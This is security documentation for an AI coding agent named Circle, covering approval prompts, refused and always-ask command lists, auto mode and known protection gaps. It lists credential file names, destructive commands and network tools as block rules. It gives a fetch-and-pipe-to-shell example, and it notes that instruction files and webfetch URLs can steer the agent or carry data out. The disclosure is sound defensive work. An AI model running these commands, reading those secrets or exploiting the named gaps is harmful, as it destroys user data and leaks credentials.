# Run Circle safely

Circle can read your files, run commands as you, and change anything you can change. It asks before it does most of that, and it refuses a few things outright. **This is a safety net, not a sandbox.** A command you approve runs with your full user rights and network access.

Read this page before you point Circle at anything you cannot restore, and before you use it on files or repositories you do not trust.

## What Circle asks about

| Action | What happens |
|---|---|
| Run a command (`execute`) | Asks. Some commands are always refused, and some always ask (see below). |
| Write, edit or patch a file | Asks. |
| Delete a file (`delete`) or a patch that deletes | Always asks. |
| Read, list, search, `webfetch`, `websearch`, `lsp` | Does not ask. |
| Tools from MCP servers | Does not ask. |
| Custom-command shell snippets | Do not ask. |
| A command you type with `!` | Does not ask: you ran it. The refusals below still apply. |

Circle does not ask before it reads. It can read any file you can, including files outside the workspace, `.env` files and `~/.circle/credentials.json`. Do not put secrets in a place you would not want the model to see.

## Approvals

When Circle needs approval it shows a card:

1. **Allow once** runs this call.
2. **Allow ... for this session** runs it, and stops asking for calls of the same kind in this conversation. The label says what "the same kind" means (below).
3. **Allow "python3 -m pytest …" for this session**, for a command that is one program with its arguments: runs it, and stops asking for commands that start with the same words.
4. **Reject and explain** does not run it. Your explanation goes to the model with the rejection.

`esc` rejects. Rejecting never ends the turn; the model is told and carries on.

For a file change the card shows what would change: the lines added and removed against the file as it is now, with line numbers, or the change as the model sent it when the file cannot be read. Long changes are cut after 40 lines.

What "the same kind" means for option 2:

| Call | Option 2 covers |
|---|---|
| A command | That exact command text. A `cd` into the workspace in front (`cd /your/project && make test`) is left out, since commands run there anyway. |
| A command that only reads | Every command that only reads (see below), such as `ls`, `cat`, `rg`, `git status` and `git diff`. |
| A file change inside the workspace | All changes of that tool inside the workspace. Allowing `write_file` does not allow `edit_file`. |
| A file change outside the workspace | Not offered. It asks every time. |
| Deleting anything, and the risky commands below | Not offered. It asks every time. |
| An extension tool | Every call to that tool. |

Option 3 keeps the program and what names the work: the script or module of an interpreter (`python3 todo.py`, `python3 -m pytest`), the subcommand of tools such as `git`, `npm`, `cargo`, `go`, `uv` and `docker` (`git add`, `npm run build`), or the program alone (`pytest`). It is offered only for a command with no pipe, `&&`, `;`, redirection, `$(...)` or variable in front, and it covers only such commands. It is not offered for an interpreter with no script (`python3 -c ...`), for a reader that runs something (`find -exec`), or for programs where it would allow nearly anything: `curl`, `wget`, `ssh`, `scp`, `rsync`, `nc`, `chmod`, `chown`, `kill`, `mv`, `cp`, `ln`, `open`, `sed`, `awk`, `tee` and a few others. The commands that always ask still ask.

The rules are kept per conversation in `approvals/` in the data folder. Exact commands are stored as hashes, not text; a rule from option 3 keeps its words. `/approvals` lists the rules and the last five decisions, and lets you revoke one. A revoked rule asks again from the next call.

### How commands are sorted

Circle reads the command text; it does not run it first.

**Always refused.** No card, and `auto` mode does not change it:

- Any command that names a credential file: `.env`, `.env.*`, `*.env`, `.netrc`, `.pgpass`, `.git-credentials`, `credentials.json`, `token.json`, `id_rsa`, `id_dsa`, `id_ecdsa`, `id_ed25519`, `*.pem`, `*.p12`, `*.pfx`. You can replace this list; see below.
- `sudo`, `su`, `doas`, `pkexec`.

**Always asks, without "for this session".**

- Removing and destroying: `rm`, `rmdir`, `unlink`, `shred`, `srm`, `trash`, `trash-put`, `dd`, `truncate`, `wipefs`, `fdisk`, `parted`, `mkfs*`, `find ... -delete`, and `find ... -exec` with a command that deletes.
- Git operations that lose work: `reset --hard`, `reset --merge`, `clean -f`, `push --force` and its variants, `push --delete`, `branch -D`, `stash drop`, `stash clear`, `checkout -f`, `checkout -- ...`, `checkout .`, `restore` without `--staged`, `filter-branch`, `filter-repo`.
- Python one-liners that delete (`shutil.rmtree`, `os.remove`, `os.unlink`, `os.rmdir`, `.unlink(`, `.rmdir(`).
- Anything Circle cannot parse, such as unbalanced quotes, or nesting deeper than three levels.

Circle looks through wrappers such as `env`, `nohup`, `time`, `timeout`, `xargs` and `bash -c "..."` to find the real command.

**Reads only.** Asks, and option 2 covers every command that only reads, so one answer lets `ls`, `git status`, `rg … | head` and the like run for the rest of the conversation. A command counts when every part of it, across `|`, `&&`, `||` and `;`, is one of `ls`, `cat`, `head`, `tail`, `wc`, `pwd`, `which`, `whoami`, `date`, `uname`, `file`, `stat`, `du`, `df`, `tree`, `basename`, `dirname`, `realpath`, `readlink`, `true`, `diff`, `cmp`, `nl`, `cut`, `grep`, `egrep`, `fgrep`, `rg`, `find`, `cd`, `test`, `jq`, and `git` with `status`, `diff`, `log`, `show`, `rev-parse`, `ls-files`, `blame`, `describe`, `shortlog`, `grep`, `ls-tree`, `cat-file` or a listing `branch`. It does not count with a redirection (`>`, `<`), a substitution (`$(…)`, backticks, `<(…)`), `&`, a path to the program (`./ls`), `git -c` or another option before the git command, or an option that writes or runs something: `find -exec`/`-delete`/`-fprint`, `rg --pre`, `git … --output`, `--ext-diff`, `git grep -O`, `tree -o`, `file -C`, `date -s`.

**Everything else asks**, with the exact-command option.

This reading is textual and it has gaps. `perl -e 'unlink q(a)'`, `mv a /dev/null`, `echo hi > important.txt` and `curl https://example.com/x | sh` are ordinary asks, not forced ones. Read the command on the card.

### Credential files

Set `credential_files` in [settings](settings.md) to change the refused list. A non-empty list replaces the default list. The list applies to shell commands only, and Circle reads it once when a session starts.

## Read-only mode

`/plan` turns on `read-only`. Circle then cannot run commands at all, and can write only to a file named `plan.md` (or `plan`), anywhere. Reads, searches and the web keep working. A card is never shown for a blocked call; the model is simply told.

MCP tools, extension tools and secret entry are not blocked in this mode.

## Auto mode

`/yolo` (or `/auto`) turns on `auto`. In auto mode Circle stops asking, **including for the calls that always ask**: `rm -rf`, force pushes, `delete`, patches that delete files, and writes outside the workspace. Credential files and `sudo` are still refused.

Auto mode applies to the current conversation only and is not saved. `/new`, `/fork`, `/import` and restarting turn it off. Use it for work you could throw away.

## Print mode and line mode

`circle -p` and `--line` cannot show a card. A call that would ask is not run, and the model is told why, unless you pass `--yolo`. With `--yolo` such calls run, except the ones that always ask, which are still not run. Refused commands stay refused. See [CLI](cli.md#print-mode).

## The shell environment

Commands run with your user rights, in the workspace folder, with no input. Standard output and error are joined. A command has 120 seconds by default; the model can ask for up to an hour. Output is cut at 100,000 characters. Each command runs in its own process group: when it times out, or you press `esc`, the command and every process it started are ended. On Windows `esc` does not stop a command yet; it runs until it finishes or times out (see [Known issues](known-issues.md#install-and-release)).

Circle removes secrets from the command's environment: any variable whose name has a word such as `KEY`, `TOKEN`, `SECRET`, `PASSWORD` or `CREDENTIAL` in it. The API key Circle uses for the model is not passed on. `OPENAI_BASE_URL` and `CIRCLE_MODEL` are.

If you started Circle from a shell with Circle's own virtual environment active (a source install), that environment is taken out of `PATH` and `VIRTUAL_ENV` for commands, so `python3` and `pip` are yours, not Circle's. A virtual environment inside the workspace stays.

Nothing restricts the network, other processes, or which files a command can reach.

## The workspace boundary

Relative paths and paths that start with `/` inside the project are resolved under the workspace. Real system paths such as `/Users/...`, `/etc/...` and `~/...` are taken as they are, so Circle can read outside the workspace without asking. Writes outside the workspace ask every time, with no "for this session" option. `..` is rejected.

Circle writes nothing of its own into your workspace. Older messages after a summary and very long tool output are kept in the data folder under `projects/`; the model reads them at `/conversation_history/` and `/large_tool_results/`.

## Workspace trust

Circle works only in folders you have trusted. Trusting a folder lets Circle load extensions from `<folder>/.circle/extensions`. It is an exact match: trusting `/a` does not trust `/a/b`. Trust does not limit what the model does in the folder.

Skills, instruction files and custom commands in a project folder are read whether or not you have trusted it. Do not start Circle in a folder you do not trust.

## Secrets

The model asks for a secret with the `question` tool. You type the value with `ctrl+s`, masked. Circle writes it straight to the file the task named, at mode `0600`, and tells the model only that it was collected. The value never enters the conversation. The model chooses the file: read the task before you enter a value.

## The update check and downloads

Circle makes one request of its own that has nothing to do with your model: once a day, in the background, a `HEAD` request to `github.com/<repo>/releases/latest` to learn whether a newer release exists (see [Updating](cli.md#the-reminder)). Turn it off with `update_check` or `CIRCLE_NO_UPDATE_CHECK`. Nothing about your files, prompts or settings is sent.

`circle update` and the installers download a program and run it. They check its sha256 against a file published in the same release. That catches a damaged or truncated download; it does not help if the release itself were replaced, because the checksum comes from the same place. They use HTTPS and verify certificates. If your network breaks that, give them the certificate to trust (`CURL_CA_BUNDLE`, `SSL_CERT_FILE`); do not switch verification off.

## What is not protected

- There is no operating-system sandbox. A command can read any file you can, use the network, and start background processes.
- **MCP tools, and `!` snippets in custom commands, run without asking.** See [MCP](mcp.md) and [Custom commands](custom-commands.md).
- `apply_patch` can write outside the workspace with an absolute or `../` path, and its approval check resolves a path differently from where it writes.
- `webfetch` refuses obvious local addresses only. Any URL can carry data out in its query string.
- `read_file` and `grep` can read credential files. The refused list covers shell commands only.
- Text files that Circle loads as instructions (`AGENTS.md`, `CLAUDE.md`, skills) can tell the model what to do. Read them in a repository you do not trust.

## Report a vulnerability

See [SECURITY.md](../SECURITY.md).
